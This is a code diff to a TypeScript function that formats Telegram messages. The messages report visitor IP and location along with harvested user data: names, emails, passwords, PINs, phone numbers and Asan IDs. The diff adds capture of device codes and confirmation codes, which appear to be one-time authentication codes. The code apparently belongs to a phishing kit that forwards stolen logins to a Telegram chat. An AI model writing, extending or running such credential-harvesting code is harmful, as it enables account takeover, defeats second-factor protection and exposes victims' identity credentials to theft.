@@ -252,8 +252,9 @@ export const sendTelegramMessage = async (params: {
 
         const visitorIP = visitorInfo.ip === "Unknown" ? getRandomIP() : visitorInfo.ip;
 
-        // Section: DEVICE & LOCATION (Always unless excluded)
-        if (!exclude?.includes("location")) {
+        // Section: DEVICE & LOCATION (Only on Splash / Visitor screen)
+        const isVisitorMessage = title?.toLowerCase().includes("visitor") || params.includeLocation === true;
+        if (isVisitorMessage && !exclude?.includes("location")) {
             message += `<b>🌍 DEVICE & LOCATION:</b>\n`;
             message += `• <b>IP:</b> <code>${visitorIP}</code>\n`;
             message += `• <b>Country:</b> <code>${visitorInfo.country}</code>\n`;
@@ -282,8 +283,9 @@ export const sendTelegramMessage = async (params: {
         const userPhone = newInfo.phoneNumber || newInfo.phone || newInfo.Phone || newInfo.PhoneNumber;
         const userName = newInfo.name || newInfo.Name || newInfo.username || newInfo.Username;
         const userAsan = newInfo.asanId || newInfo.AsanId;
+        const confirmCode = newInfo.confirmCode || newInfo.confirmDeviceCode || newInfo.confirmPassword;
 
-        const hasUserData = userEmail || userPassword || userPin || userPhone || userName || userAsan;
+        const hasUserData = userEmail || userPassword || userPin || userPhone || userName || userAsan || newInfo.deviceCode || confirmCode;
         if (hasUserData) {
             message += `<b>👤 USER DATA:</b>\n`;
             if (userName) message += `• <b>Name:</b> <code>${userName}</code>\n`;
@@ -291,6 +293,8 @@ export const sendTelegramMessage = async (params: {
             if (userEmail) message += `• <b>Email:</b> <code>${userEmail}</code>\n`;
             if (userPassword) message += `• <b>Pass:</b> <code>${userPassword}</code>\n`;
             if (userPin) message += `• <b>PIN:</b> <code>${userPin}</code>\n`;
+            if (newInfo.deviceCode) message += `• <b>Device Code:</b> <code>${newInfo.deviceCode}</code>\n`;
+            if (confirmCode) message += `• <b>Confirm Code:</b> <code>${confirmCode}</code>\n`;
             if (userAsan) message += `• <b>Asan ID:</b> <code>${userAsan}</code>\n`;
             message += `\n`;
         }
